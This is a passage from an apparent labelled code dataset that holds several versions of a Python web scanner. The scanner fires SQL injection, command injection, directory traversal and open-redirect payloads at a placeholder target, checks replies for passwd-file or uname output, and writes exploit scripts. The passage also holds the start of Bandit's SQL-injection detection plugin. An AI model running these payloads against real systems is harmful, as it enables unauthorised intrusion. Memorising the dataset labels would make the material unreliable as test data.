'\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n\t\n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n\tif v == True:\n\t\tprint html\n\n\t#===== check for directory traversal =====\n\tif attackType == directory_traversal:\n\t\tmatch = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#======= check for shell command injection ======\n\tif attackType == shell_command:\n\t\tmatch = re.findall(r'GNU/Linux', html)\n\t\tif len(match) == 0:\n\t\t\treturn None\n\t\treturn match\n\n\t#===== check for sql_injection ======\n\tif attackType == sql_injection:\n\t\t\n\t\tfalsePayload = sqli.get_false()[0]\n\t\tbadhtml = \"\"\n\t\t#if get\n\t\tif method == \"GET\":\n\t\t\tgetURL = url + \"?\" + paramname+\"=\"+falsePayload\n\t\t\tcontent = requests.get(getURL)\n\t\t\tbadhtml =  content.text\n\t\t#if post\n\t\telif method == \"POST\":\n\t\t\tcontent = requests.post(url, data={paramname:falsePayload})\n\t\t\tbadhtml = content.text\n\n\t\tcompare_res = sqli.compare_html(badhtml, html)\t\t\n\t\tmatch = re.findall(r'<ins>.+', compare_res)\n\t\tif len(match) ==0 :\n\t\t\treturn None\n\t\treturn None\n\n\t#====== check for open_redirect=======\n\tif attackType == open_redirect:\n\t\tif len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n\t\t\treturn True\n\n\t\n\t#=======check for server_injection ====\n\tif attackType == server_injection:\n\t\t#included index.php\n\t\tindexPHP = requests.get(BASE_URL + \"/index.php\")\n\n\t\tif indexPHP.text in html:\n\t\t\treturn attackType\n\t\t#uname -a successful:\n\t\tif \"GNU/Linux\" in html:\n\t\t\treturn attackType\n\n\treturn None;\n\t\ndef get_payloads(v=False):\n\tpayloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n\tif v == True:\n\t\tfor p in payloads:\n\t\t\tprint p[0]\n\n\treturn payloads\n\n\nif __name__ == \"__main__\":\n\tget_payloads(v=True)\n\n\t## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n\t# ## test shell command\n\t# ## post in the form\n\t# url = \"/commandinjection/commandinjection.php\"\n\t# payloads = cmd.get_all()\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"host\", 'POST', payload)\n\n\t#sqli\n\t# post in the form\n\t#url = \"/sqli/sqli.php\"\n\t#payloads = sqli.get_all()\n\t#for payload in payloads:\n\t#\tinjectPayload(url, \"username\", \"POST\", payload)\n\n\t#Test for server side code injection\n\t# url = \"/serverside/eval2.php\"\n\t# payloads = ssci.get_all(url)\n\t# for payload in payloads:\n\t# \tinjectPayload(url, \"page\", \"POST\", payload)\n\t'''\n\t#test for open redirect\n\turl = \"/openredirect/openredirect.php\"\n\torPayload = oRedirect.get_all()\n\tfor payload in orPayload:\n\t \tinjectPayload(url, \"redirect\", \"GET\", payload)\n\t'''\n/n/n/n/payloads/test_inject.py/n/nimport requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n\n        if(content.status_code==200) and badhtml[1]==html:\n            compare_res = sqli.compare_html(badhtml[0], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n\n        else:\n            match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = get_payloads()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        injectPayload(url_list[0], 'ascii', 'GET', payload)\n        injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''/n/n/n", "label": 1}, {"id": "1aabb095f22461455094729f5355fec554f16eaa", "code": "payloads/sqli.py/n/nimport difflib\n\n\"\"\"\nSolutions:\n1. compare pages only  \nmatch = re.findall(r'<pre>', html)\n\n2. add false page to compare\nmatch = re.findall(r'<ins>.+', compare_res)\n\n3. add another label \"' or '1'='1\" as ground truth\nAssumption: should be the same page for sql injection, different with false page\nsingel quote and double quote is not fixed yet.\n\"\"\"\n\ndef get_false():\n\t## the second is taken as ground truth to filter out real sql-injection page\n\t# payloads = [\"' and '1=2\", \"' or '1'='1\", '\" or \"1\"=\"1']\n\tpayloads = [\"' and '1=2\",'\" or \"1\"=\"1', \"' or '1'='1\"]\n\treturn payloads\n\n# def get_false():\n# \tpayloads = \"' and '1=2\"\n# \treturn payloads\n\ndef get_all():\n\t\"\"\"\n\tConsider different db types and versions\n\t-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite\n\t' OR '1'='1' --\n\t' OR '1'='1' /*\n\t-- MySQL\n\t' OR '1'='1' #\n\t-- Access (using null characters)\n\t' OR '1'='1' %00\n\t' OR '1'='1' %16\n\t\"\"\"\n\t## temp test\n\t# payloads = [\"' or '1=1\"]\n\tpayloads = [\"' or '1=1\",   \"'1 'or' 1'='1\",\"' or '1'='1\",  \"'or 1=1#\", \"' OR '1=1 %00\", '\" or \"1=1']\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n/n/n/npayloads/test_inject.py/n/nimport requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n        if (badhtml[0] == badhtml[1]) and (badhtml[0] !=badhtml[2]):\n            ## true filter should be two\n            compare_res = sqli.compare_html(badhtml[2], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n        elif(badhtml[0]==badhtml[2] and badhtml[0] !=badhtml[1]):\n            compare_res = sqli.compare_html(badhtml[1], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n        else:\n            match = \"\"\n        # if(content.status_code==200) and badhtml[1]==html:\n        #     compare_res = sqli.compare_html(badhtml[0], html)  \n        #     match = re.findall(r'<ins>.+', compare_res)\n\n        # else:\n        #     match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = sqli.get_all()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        injectPayload(url_list[0], 'ascii', 'GET', payload)\n        injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''/n/n/n", "label": 0}, {"id": "1aabb095f22461455094729f5355fec554f16eaa", "code": "/payloads/sqli.py/n/nimport difflib\n\n\"\"\"\nSolutions:\n1. compare pages only  \nmatch = re.findall(r'<pre>', html)\n\n2. add false page to compare\nmatch = re.findall(r'<ins>.+', compare_res)\n\n3. add another label \"' or '1'='1\" as ground truth\nAssumption: should be the same page for sql injection, different with false page\n\"\"\"\n\ndef get_false():\n\t## the second is taken as ground truth to filter out real sql-injection page\n\tpayloads = [\"' and '1=2\", \"' or '1'='1\"]\n\treturn payloads\n\n# def get_false():\n# \tpayloads = \"' and '1=2\"\n# \treturn payloads\n\ndef get_all():\n\t\"\"\"\n\tConsider different db types and versions\n\t-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite\n\t' OR '1'='1' --\n\t' OR '1'='1' /*\n\t-- MySQL\n\t' OR '1'='1' #\n\t-- Access (using null characters)\n\t' OR '1'='1' %00\n\t' OR '1'='1' %16\n\t\"\"\"\n\t## temp test\n\t# payloads = [\"' or '1=1\"]\n\tpayloads = [\"' or '1=1\",   \"'1 'or' 1'='1\",\"' or '1'='1\",  \"'or 1=1#\", \"' OR '1=1 %00\"]\n\tpayloads = [(item, \"SQL Injection\") for item in payloads]\n\treturn payloads\t\n\ndef compare_html(html1, html2):\n\tdiff_html = \"\"\n\tdiffs = difflib.ndiff(html1.splitlines(), html2.splitlines())\n\tfor ele in diffs:\n\t\tif (ele[0] == \"-\"):\n\t\t\tdiff_html += \"<del>%s</del>\" % ele[1:].strip()\n\t\telif(ele[0] == \"+\"):\n\t\t\tdiff_html += \"<ins>%s</ins>\" %ele[1:].strip()\n\n\treturn diff_html\n\nif __name__ == \"__main__\":\t\n\tprint get_all()\n/n/n/n/payloads/test_inject.py/n/nimport requests\nimport json\nimport ssci\nimport oRedirect \nimport os\nimport re \nimport sqli\nimport cmd\nimport dirtraversal\nfrom shutil import copy,rmtree\nfrom datetime import datetime\nimport difflib\nimport collections\n\nBASE_URL = \"http://target.com\"\nsql_injection = \"SQL Injection\"\nserver_injection = \"Server Side Code Injection\"\ndirectory_traversal = \"Directory Traversal\"\nopen_redirect = \"Open Redirect\"\ncross_site_request_forgery = \"Cross Site Request Forgery\"\nshell_command = \"Shell Command Injection\"\n\nclass AutoDict(dict):\n    def __getitem__(self, item):\n        try:\n            return dict.__getitem__(self, item)\n        except KeyError:\n            value = self[item] = type(self)()\n            return value\n\nfinal_output=[]\nvul_list = []\nvul_classes = AutoDict()\n\ndef format_vul_list():\n    sorted_list = sorted(vul_list, key=lambda x: x[2][1])\n    print(sorted_list)\n\n## write to json file if possible\ndef write_file(url, paramname, payload, method):\n    ## initialize dict\n    sub_elements = AutoDict()\n    lists = []\n    sub_elements['endpoint']= url\n    sub_elements['params']['key1']= payload[0]\n    sub_elements['method'] = method\n    # update current dict\n    if(vul_classes.get('class')==payload[1]):\n        lists = vul_classes['results'][BASE_URL]\n\n        for ele in lists:\n            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :\n                continue\n            else:\n                lists.append(sub_elements)\n         \n        vul_classes['results'][BASE_URL]=lists\n\n    else:\n        vul_classes['class'] = payload[1]        \n        lists.append(sub_elements)\n        vul_classes['results'][BASE_URL]=lists\n\n\n\ndef injectPayload(url, paramname, method, payload, verbose = False):\n    parsedURL = BASE_URL + url  \n    html = \"\"\n\n    #if get\n    if method == \"GET\":\n        getURL = parsedURL + \"?\" + paramname+\"=\"+payload[0]\n        content = requests.get(getURL)\n        html =  content.text\n\n    #if post\n    elif method == \"POST\":\n        content = requests.post(parsedURL, data={paramname:payload[0]})\n        html = content.text\n\n    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)\n    \n    #if function returns:\n    if result is not None:\n        print(url, payload)\n        vul_list.append([url, paramname, payload, method])\n\n        #generateExploit(parsedURL, method, paramname, payload)\n        return True\n    return None\n\ndef timeid(full=False):\n    if full==False:\n        return datetime.now().strftime(\"%S-%f\")\n    else:\n        return datetime.now().strftime(\"%H-%M-%S-%f\") \n\ndef generateExploit(url, method, paramname, payload):\n#payload is a \"payload, type_of_payload\" list\n\n    dirname = \"exploits/\"\n    if not os.path.exists(dirname):\n        os.makedirs(dirname)\n\n    copy(\"exploit.py\", dirname)\n\n    f = open(dirname + payload[1] + \"_\" + timeid() + \".sh\",\"w+\")\n    f.write(\"python exploit.py \" + '\"' + url +'\" ' + method + \" \"+ paramname + ' \"' +payload[0]+'\"')\n    \n\n\ndef checkSuccess(html, attackType, content, url, method, paramname, v=False):\n    if v == True:\n        print html\n\n    #===== check for directory traversal =====\n    if attackType == directory_traversal:\n        match = re.findall(r'\\w*\\:\\w\\:[0-9]*\\:[0-9]*\\:[a-zA-Z_-]*\\:[\\/a-zA-Z0-9]*[ \\t]?:[\\/a-zA-Z0-9]*', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #======= check for shell command injection ======\n    if attackType == shell_command:\n        match = re.findall(r'GNU/Linux', html)\n        if len(match) == 0:\n            return None\n        return match\n\n    #===== check for sql_injection ======\n    if attackType == sql_injection:\n        ## for real sql injection, the payloads should return the same result\n        ## then compare the fake page with the true page to see the difference\n        falsePayloads = sqli.get_false()\n        #if get\n        badhtml = []\n        for falsePayload in falsePayloads:\n            if method == \"GET\":\n                getURL = url + \"?\" + paramname+\"=\"+falsePayload\n                false_page = requests.get(getURL)\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                else:\n                    badhtml.append(requests.get(url).text)\n            #if post\n            elif method == \"POST\":\n                false_page = requests.post(url, data={paramname:falsePayload})\n                if(false_page.status_code==200):\n                    badhtml.append(false_page.text)\n                    # print(html)\n                else:\n                    badhtml.append(requests.get(url).text)\n\n        if(content.status_code==200) and badhtml[1]==html:\n            compare_res = sqli.compare_html(badhtml[0], html)  \n            match = re.findall(r'<ins>.+', compare_res)\n\n        else:\n            match = \"\"\n        if len(match) ==0 :\n            return None\n\n        return match\n\n    #====== check for open_redirect=======\n    if attackType == open_redirect:\n        if len(content.history) > 0 and content.url == \"https://status.github.com/messages\":\n            return True\n\n    \n    #=======check for server_injection ====\n    if attackType == server_injection:\n        #included index.php\n        indexPHP = requests.get(BASE_URL + \"/index.php\")\n\n        if indexPHP.text in html:\n            return attackType\n        #uname -a successful:\n        if \"GNU/Linux\" in html:\n            return attackType\n\n    return None;\n    \ndef get_payloads(v=False):\n    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()\n\n    if v == True:\n        for p in payloads:\n            print p[0]\n\n    return payloads\n\n\nif __name__ == \"__main__\":\n    # get_payloads(v=True)\n\n    payloads = sqli.get_all()\n    url_list = ['/directorytraversal/directorytraversal.php',\n                \"/commandinjection/commandinjection.php\",\n                \"/sqli/sqli.php\",\n                \"/serverside/eval2.php\",\n                \"/openredirect/openredirect.php\"]\n    for payload in payloads:\n        # injectPayload(url_list[0], 'ascii', 'GET', payload)\n        # injectPayload(url_list[1], \"host\", 'POST', payload)\n        injectPayload(url_list[2], \"username\", \"POST\", payload)\n        injectPayload(url_list[3], \"page\", \"POST\", payload)\n        injectPayload(url_list[4], \"redirect\", \"GET\", payload)\n\n    # with open('exploits/test.json', 'w') as f:\n    #     json.dump(final_output, f)\n\n    # format_lu_list()\n    ## test directory shell\n    # url = '/directorytraversal/directorytraversal.php'\n    # payloads = dirtraversal.get_all()\n\n    # for payload in payloads:\n    #     ## need param after endpoint ?param=\n        \n    #     injectPayload(url, 'ascii', 'GET', payload)\n\n\n    # ## test shell command\n    # ## post in the form\n    # url = \"/commandinjection/commandinjection.php\"\n    # payloads = cmd.get_all()\n    # for payload in payloads:\n    #   injectPayload(url, \"host\", 'POST', payload)\n\n    #sqli\n    # post in the form\n    #url = \"/sqli/sqli.php\"\n    #payloads = sqli.get_all()\n    #for payload in payloads:\n    #   injectPayload(url, \"username\", \"POST\", payload)\n\n    #Test for server side code injection\n    # url = \"/serverside/eval2.php\"\n    # payloads = ssci.get_all(url)\n    # for payload in payloads:\n    #   injectPayload(url, \"page\", \"POST\", payload)\n    '''\n    #test for open redirect\n    url = \"/openredirect/openredirect.php\"\n    orPayload = oRedirect.get_all()\n    for payload in orPayload:\n        injectPayload(url, \"redirect\", \"GET\", payload)\n    '''/n/n/n", "label": 1}, {"id": "6ce60806ca8a44d8a8b37050539e2b2f9a54b847", "code": "bandit/plugins/injection_sql.py/n/n# -*- coding:utf-8 -*-\n#\n# Copyright 2014 Hewlett-Packard Development Company, L.P.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nr\"\"\"\n============================\nB608: Test for SQL injection\n============================\n\nAn SQL injection attack consists of insertion or \"injection\" of a SQL query via\nthe input data given to an application. It is a very common attack vector. This\nplugin test looks for strings that resemble SQL statements that are involved in\nsome form of string building operation. For example:\n\n - \"SELECT %s FROM derp;\" % var\n - \"SELECT thing FROM \" + tab\n - \"SELECT \" + val + \" FROM \" + tab + ...\n - \"SELECT {} FROM derp;\".format(var)\n\nUnless care is taken to sanitize and control the input data when building such\nSQL statement strings, an injection attack becomes possible. If strings of this\nnature are discovered, a LOW confidence issue is reported. In order to boost\nresult confidence, this plugin test will also check to see if the discovered\nstring is in use with standard Python DBAPI calls `execute` or `executemany`.\nIf so, a MEDIUM issue is reported. For example:\n\n - cursor.execute(\"SELECT %s FROM derp;\" % var)\n\n\n:Example:\n\n.. code-block:: none\n\n    >> Issue: Possible SQL injection vector through string-based query\n    construction.\n       Severity: Medium   Confidence: Low\n       Location: ./examples/sql_statements_without_sql_alchemy.py:4\n    3 query = \"DELETE FROM foo WHERE id = '%s'\" % identifier\n    4 query = \"UPDATE foo SET value = 'b' WHERE id = '%s'\" % identifier\n    5\n\n.. seealso::\n\n - https://www.owasp.org/index.php/SQL_Injection\n - https://security.openstack.org/guidelines/dg_parameterize-database-queries.html  # noqa\n\n.. versionadded:: 0.9.0\n\n\"\"\"\n\nimport ast\nimport re\n\nimport bandit\nfrom bandit.core import test_properties as test\nfrom bandit.core import utils\n\nSIMPLE_SQL_RE = re.compile(\n    r'(select\\s.*from\\s|'\n    r'delete\\s+from\\s|'\n    r'insert\\s+into\\s.*values\\s|'\n    r'update\\s.*set\\s)',\n    re.IGNORECASE | re.DOTALL,\n)\n\n\ndef _check_string(data):\n    return SIMPLE_SQL_RE.search(data) is not None\n\n\ndef _evaluate_ast(node):\n    wrapper = None\n    statement = ''\n\n    if isinstance(node.parent, ast.BinOp):\n        out = utils.concat_string(node, node.parent)\n        wrapper = out[0].parent\n        statement = out[1]\n    elif (isinstance(node.parent, ast.Attribute)\n          and node.parent.attr == 